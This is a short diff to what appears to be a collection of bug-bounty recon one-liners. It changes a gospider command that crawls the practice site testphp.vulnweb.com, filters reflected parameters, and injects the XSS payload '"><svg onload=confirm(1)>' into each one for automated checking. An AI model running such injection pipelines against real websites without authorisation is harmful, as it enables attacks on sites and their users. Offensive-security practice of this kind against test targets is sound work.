@@ -46,5 +46,5 @@ waybackurls testphp.vulnweb.com | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*
 
 gospider
 ```bash
-gospider -s "testphp.vulnweb.com" -c 10 -d 5 -t 100 --other-source | tr " " "\n" | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
+gospider -s "http://testphp.vulnweb.com" -c 10 -d 5 -t 100 --other-source | tr " " "\n" | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
 ```
